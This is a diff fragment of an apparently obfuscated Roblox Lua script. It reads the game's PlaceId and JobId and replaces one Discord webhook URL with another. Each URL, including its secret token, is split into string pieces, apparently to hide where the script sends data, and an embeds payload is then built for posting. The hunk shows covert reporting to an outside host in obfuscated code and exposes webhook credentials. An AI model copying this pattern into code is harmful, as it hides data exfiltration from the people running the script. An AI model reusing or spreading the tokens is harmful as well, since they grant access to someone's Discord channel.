@@ -16282,12 +16282,10 @@ L_1_[118] = game["PlaceId"] or 0
 L_1_[106] = game["JobId"] or "Unknown"
 L_1_[61] = L_1_[2]({
 	"https://discord.com/";
-	"api/webhooks/14591590";
-	"71058825419/2BGddRx";
-	"ZvaKR39ECi8XAlMl43";
-	"zNvKPPpp9UShDZrMPgtJj";
-	"LCuVGsoLCTzOP4QxCJkAy";
-	"8"
+	"api/webhooks/1459781179216";
+	"761001/k2NuR9Qo9J_-XoYIFG";
+	"h9YGBqjUFNClbmzmK5-xQ6Ozv";
+	"-86fR2lrOPZAcOTL6eNdvX84l";
 })
 L_1_[71] = {
 	["embeds"] = {
